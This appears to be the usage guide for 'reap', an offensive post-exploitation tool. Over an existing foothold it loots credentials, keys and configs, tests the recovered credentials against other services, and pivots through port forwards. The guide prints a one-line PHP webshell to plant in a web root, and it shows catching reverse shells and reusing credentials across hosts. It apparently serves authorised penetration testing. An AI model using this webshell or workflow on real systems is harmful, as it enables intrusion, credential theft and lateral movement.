# reap — Usage Guide

## What reap is (and isn't)

reap runs **after** you already have access to a target. **You** get the foothold
(exploit, creds, RCE, a caught shell). reap then connects to that access and does the
boring part: harvests loot (secrets, configs, keys, env), tests discovered credentials
against discovered services, and gives you a ranked findings list + report.

> reap does **not** exploit anything or get the shell for you. You bring a working
> exec channel; reap loots and correlates over it.

---

## 1. Install (once per Kali)

Get the project onto the box (`git clone`, or copy the folder over via scp/rsync/USB), then:

```bash
cd ~/reap                    # the project folder
./install.sh --full          # local .venv + all optional backends
# or, for a global command that needs no activation:
./install.sh --pipx --full   # editable `reap` on your PATH (needs pipx; see below)
```

For the `.venv` install, use it from each new terminal with:

```bash
source ~/reap/.venv/bin/activate && reap
```

Notes:
- `--pipx` needs pipx first: `sudo apt install -y pipx && pipx ensurepath` (then a new shell).
- Behind a TLS-intercepting proxy, add `--trusted-host`.
- `./install.sh --help` lists all flags (`--db`, `--win`, `--full`, `--pipx`, `--with-pwncat`, `--trusted-host`).
- Prefer not to activate a `.venv`? `alias reap='~/reap/.venv/bin/reap'` in `~/.bashrc`.

---

## 2. Start it

```bash
reap                      # interactive console
reap --db engagement.db   # use a named loot DB that persists across hosts/hops
```

---

## 3. Tell reap how you got in  ← the part that matters

reap works over a **session**. Register the one that matches **the access you already
have** (`register` auto-fingerprints OS / privilege / runtimes afterwards):

| What your foothold is | Register it with |
|---|---|
| SSH password | `register ssh <ip> <user> <password>` |
| SSH private key | `register ssh <ip> <user> --key /path/key [--port 22]` |
| Windows + WinRM creds | `register winrm <ip> <user> <password> [--ssl] [--port 5985]` |
| **Web shell** (HTTP RCE: a page that runs a command parameter) | `register webshell <url> [--param cmd] [--method POST]` |
| Raw reverse shell (nc) | `register listen <port>` then fire your payload |
| Raw bind shell | `register bind <host> <port>` |

### "My shell isn't SSH" — read this

reap needs a channel it can **send a command to and read the output back from**.
Match your situation:

- **You have web / command-injection RCE** (you can hit a URL that runs commands) →
  use the **`webshell`** adapter — this is exactly the webshell-RCE pattern reap is built
  for. Drop a tiny webshell into a web-served directory, then register the URL:
  ```bash
  # via your RCE, write to the web root, e.g.:  <?php system($_REQUEST["cmd"]); ?>
  reap> register webshell http://target/uploads/sh.php
  # --param NAME if it reads a different parameter; --method GET if it's a GET shell
  ```

- **You caught (or will catch) a raw reverse/bind shell** → reap drives it directly:
  - Reverse shell: `register listen <port>`, then fire your payload — reap becomes the
    listener and catches the callback (don't use a separate `nc`).
  - Bind shell: `register bind <host> <port>`.
  - Windows `cmd.exe` shell: add `--shell cmd`.

  reap wraps each command with a sentinel to recover its output and exit code over the raw
  socket. There is no PTY, so interactive prompts (a sudo password, an editor) won't work —
  reap only runs commands that return, so collection is fine. For stability-sensitive work,
  upgrade to SSH instead: stabilize in **pwncat-vl**, drop your key, then `register ssh`.

- **Windows shell that isn't WinRM** → get/enable WinRM creds and `register winrm`,
  or drop a webshell on the IIS app and `register webshell`.

> **Rule of thumb:** web RCE → `webshell`. Interactive shell or creds → get to
> `ssh`/`winrm`. reap meets you at a *stable exec channel*, not a raw shell.

---

## 4. The workflow (identical for every adapter)

```text
reap> register <...>      # 1. attach to your foothold (auto-fingerprints)
reap> run                 # 2. fire matched loot modules, then auto-correlate
reap> creds               # 3a. recovered credentials + which services they unlocked
reap> findings            # 3b. ranked loot (high-severity / capabilities on top)
reap> report loot.md      # 4. write timeline + ranked findings to markdown
```

Found a credential that works on another box? `register` that host too — the loot DB
persists, so correlation spans every hop and gets smarter as you go deeper.

---

## 5. Command reference

| command | what it does |
|---|---|
| `register <adapter> …` | attach to a foothold (ssh / winrm / webshell / bind / listen / handoff) |
| `sessions` / `use <id>` | list registered sessions / switch the active one |
| `hosts` | list discovered hosts (persist in the loot DB) |
| `fingerprint` | re-probe the active session (OS, priv, runtimes) |
| `run` | collect loot from the active session, then correlate |
| `correlate` | re-test discovered creds against discovered services |
| `forward <rhost> <rport> [lport]` | tunnel a target-internal service to `127.0.0.1` via the active SSH session (like `ssh -L`) |
| `forwards` / `unforward <lport>` | list / tear down active port forwards |
| `creds` | credentials and their verified reuse |
| `findings` (alias `loot`) | ranked findings list |
| `search <regex>` | search findings by title / detail / note |
| `note <id> <text>` | annotate a finding (shows in the report) |
| `report [file.md] [redact]` | timeline + ranked findings to markdown (`redact` masks secrets) |
| `export <creds\|targets\|json> [path]` | hydra/nxc user+pass lists, host:port targets, or full JSON |
| `import <nmap.xml>` | seed services from an nmap scan |
| `modules` | which modules match the active context |
| `help` / `exit` | help / quit |

---

## 6. Reaching internal / loopback-only services (port forwarding)

Services bound to a target's `127.0.0.1` (a DB, an admin panel, a second SSH) aren't
reachable from your Kali — but reap already holds your SSH session, so it can tunnel to
them itself, same as `ssh -L` but with no second terminal and no re-auth. **Needs an
SSH-backed session** (a `register ssh` or pwncat handoff); a `webshell` session has no
transport to forward through.

**Automatic.** On `run`, reap auto-forwards any loopback-bound DB/SSH/etc. it discovers
and registers the local end so `correlate` reaches it:

```text
reap> register ssh 10.10.10.5 haris --key ~/.ssh/id_rsa
reap> run
  ...
  auto-forward 127.0.0.1:24306 → 10.10.10.5 loopback mysql/3306
reap> correlate
  REUSE  /var/www/app/config.php -> svc_db@127.0.0.1:24306 (mysql)   # looted DB pass works
```
(Disable with `export REAP_NO_AUTOFORWARD=1`.)

**Manual.** Forward anything reachable from the foothold — including a *different* internal
host — then point an adapter or `correlate` at `127.0.0.1:<local_port>`:

```text
reap> forward 127.0.0.1 1337            # the foothold's own loopback :1337
  forward up 127.0.0.1:24137 → 127.0.0.1:1337 (via ssh:haris@10.10.10.5:22)
reap> forward 10.10.20.50 22 2222       # a second box only reachable from the foothold
reap> register ssh 127.0.0.1 arthur 'pw' --port 2222   # loot box two through the pivot
reap> forwards                          # list them;  unforward 2222  closes one
```

Because the loot store persists across hops, creds found on the foothold are correlated
against the forwarded/internal services automatically.

---

## 7. Tips

- **Headless / scripted** (or when a webshell sweep is slow): use the driver instead of
  the REPL —
  ```bash
  python reap_run.py 'webshell:http://target/sh.php' engagement.db
  python reap_run.py 'ssh:user:pass@10.10.10.5' engagement.db
  python reap_run.py 'ssh-key:user@10.10.10.5:/path/key' engagement.db
  ```
- **Webshell channel is slow for broad sweeps** (PHP per-request time limits). Over SSH
  it's fast. For webshell, prefer `reap_run.py` (or just let `run` finish).
- **Editing reap needs no reinstall** — it's an editable install, so new modules/plugins
  load on the next `run`.
- **Heavy enum wrappers** (LinPEAS/WinPEAS/SharpHound) only fire if you opt in with
  `export REAP_HEAVY=1` and the tools are on disk.
